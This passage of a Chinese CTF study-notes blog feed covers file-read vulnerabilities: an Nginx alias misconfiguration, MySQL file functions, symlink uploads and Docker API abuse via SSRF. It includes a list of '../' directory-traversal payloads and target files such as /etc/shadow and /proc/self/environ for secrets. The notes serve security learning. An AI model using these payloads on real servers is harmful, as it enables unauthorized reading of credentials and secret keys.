title="Nginx错误配置"></a>Nginx错误配置</h4><p>常搭配Python-Web应用一起出现。</p><ul><li>/static../ -&gt; /home/myapp/static/../，产生目录穿越，穿越至myapp目录。原因：location最后没有加‘/’限制<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location &#x2F;static &#123;</span><br><span class="line">  alias &#x2F;home&#x2F;myapp&#x2F;static&#x2F;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><p>MySQL：</p><ul><li>load_file(),利用条件严格，但仍然常出相关文件读取题目。</li><li>load data infile，需要执行完整的SQL语句且需要FILE权限，比较少见，除了SSRF攻击MySQL以外，很少能够直接执行整条非基本SQL语句的机会。</li></ul><h4 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h4><p>又称符号链接，即soft link或symbolic link。相当于win下的快捷方式。</p><p>硬链接与软链接的区别： <a href="https://www.jianshu.com/p/b035d94fa959">https://www.jianshu.com/p/b035d94fa959</a></p><p>bash命令<code>ln-s</code>可以创建一个指向指定文件的软链接文件，然后将该文件上传至服务器，访问该链接文件时，实际上是在请求服务端它指向的文件。</p><h4 id="FFmpeg"><a href="#FFmpeg" class="headerlink" title="FFmpeg"></a>FFmpeg</h4><p>CISCN 2017 FFmpeg 任意文件读取漏洞</p><h4 id="Doker-API"><a href="#Doker-API" class="headerlink" title="Doker-API"></a>Doker-API</h4><p>Docker-API可以控制Docker的行为，Docker-API通过UNIX Socket通信，也可以通过HTTP直接通信。当可以通过SSRF漏洞进行UNIX Socket通信时，就可以通过操纵Docker-API把本地文件载入Docker新容器进行读取（利用Docker的ADD、COPY操作）。</p><h3 id="客户端相关"><a href="#客户端相关" class="headerlink" title="客户端相关"></a>客户端相关</h3><p>客户端文件读取漏洞，大多基于XSS读取本地文件。</p><h4 id="浏览器-Flash-XSS"><a href="#浏览器-Flash-XSS" class="headerlink" title="浏览器/Flash XSS"></a>浏览器/Flash XSS</h4><p>js读取本地文件</p><ul><li>Safari浏览器 客户端本地文件读取漏洞</li></ul><h4 id="MarkDown语法解析器XSS"><a href="#MarkDown语法解析器XSS" class="headerlink" title="MarkDown语法解析器XSS"></a>MarkDown语法解析器XSS</h4><p>具有解析js的能力，且缺乏浏览器的读取本地文件限制。</p><h2 id="文件读取漏洞常见读取路径"><a href="#文件读取漏洞常见读取路径" class="headerlink" title="文件读取漏洞常见读取路径"></a>文件读取漏洞常见读取路径</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="flag名称（相对路径）"><a href="#flag名称（相对路径）" class="headerlink" title="flag名称（相对路径）"></a>flag名称（相对路径）</h4><p>fuzz方式获取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag(.txt|.php|.pyc|.py ...)</span><br><span class="line">flag(.txt|.php|.pyc|.py ...)</span><br><span class="line">[dir_you_know]&#x2F;flag(.txt|.php|.pyc|.py ...)</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;flag(.txt|.php|.pyc|.py ...)</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;flag(.txt|.php|.pyc|.py ...)</span><br><span class="line">..&#x2F;flag(.txt|.php|.pyc|.py ...)</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;root&#x2F;flag(.txt|.php|.pyc|.py ...)</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;home&#x2F;flag(.txt|.php|.pyc|.py ...)</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;home&#x2F;[user_you_know]&#x2F;flag(.txt|.php|.pyc|.py ...)</span><br></pre></td></tr></table></figure><h4 id="服务器信息（绝对路径）"><a href="#服务器信息（绝对路径）" class="headerlink" title="服务器信息（绝对路径）"></a>服务器信息（绝对路径）</h4><p>CTF中常见的部分须知目录和文件</p><ol><li>/etc目录<br> 多是各种应用或系统配置文件，是进行文件读取的首要目标。</li><li>/etc/passwd （详细解析：<a href="http://c.biancheng.net/view/839.html%EF%BC%89">http://c.biancheng.net/view/839.html）</a><br> Linux系统保存用户信息及其工作目录的文件，所有用户/组可读，一般用作Linux系统下文件读取漏洞存在判断的基准。从该文件可得系统中存在哪些用户，及其所属组和工作目录。</li><li>/etc/shadow （详细解析： <a href="http://c.biancheng.net/view/840.html%EF%BC%89">http://c.biancheng.net/view/840.html）</a><br> 是Linux系统保存用户信息及（可能存在）密码（hash）的文件，权限是root用户可读写、shadow组可读。所以一般情况下该文件不可读。</li><li>/etc/apache2/*<br> 是Apache的配置文件，可以获知Web目录、服务端口等信息。</li><li>/etc/nginx/*<br> 是Nginx配置文件（Ubuntu等系统），可以获知Web目录、服务端口等信息。</li><li>/etc/apparmor(.d)/*<br> 是Apparmor配置文件，可以获知各应用系统调用的白名单、黑名单。（如查看MySQL是否禁用系统调用，确定是否可以使用UDF执行系统命令）</li><li>/etc/(cron.d/*|crontab)<br> 是定时任务文件。有些题会设置一些定时任务，读取这些配置文件就可以发现隐藏的目录或其它文件。</li><li>/etc/environment<br> 是环境变量配置文件之一。环境变量可能存在大量目录信息的泄漏，甚至可能出现secret key泄漏的情况。</li><li>/etc/hostname<br> 主机名</li><li>/etc/hosts<br> 主机名查询静态表，包含知道域名解析IP的成对信息。通过该文件，可以探测网卡信息和内网IP/域名。</li><li>/etc/issue<br> 指明系统版本。</li><li>/etc/mysql/*<br> MySQL配置文件。</li><li>/etc/php/*<br> PHP配置文件。</li><li>/proc目录<br> 通常存储进程动态运行的各种信息，本质上是一种虚拟目录。<br> <em>如果查看非当前进程的信息，pid是可以暴力破解的，如果要查看当前进程，只需/proc/self/代替/proc/[pid]/即可。</em><br> 对应目录下的cmdline可读出比较敏感的信息。<code>/proc/[pid]/cmdline</code><br> 有时我们无法获取当前应用所在的目录，通过cwd命令可以直接跳转到当前目录。<code>/proc/[pid]/cwd/</code><br> 环境变量中可能存在secret_key，也可以通过environ读取。<code>/proc/[pid]/environ</code></li><li>其它目录</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第一章-Web入门&quot;&gt;&lt;a href=&quot;#第一章-Web入门&quot; class=&quot;headerlink&quot; title=&quot;第一章 Web入门&quot;&gt;&lt;/a&gt;第一章 Web入门&lt;/h1&gt;&lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="110 Bug bounty" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"/>
    
    <category term="119 Notes" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/119-Notes/"/>
    
    
    <category term="Notes" scheme="https://tsunamori.github.io/tags/Notes/"/>
    
  </entry>
  
</feed>
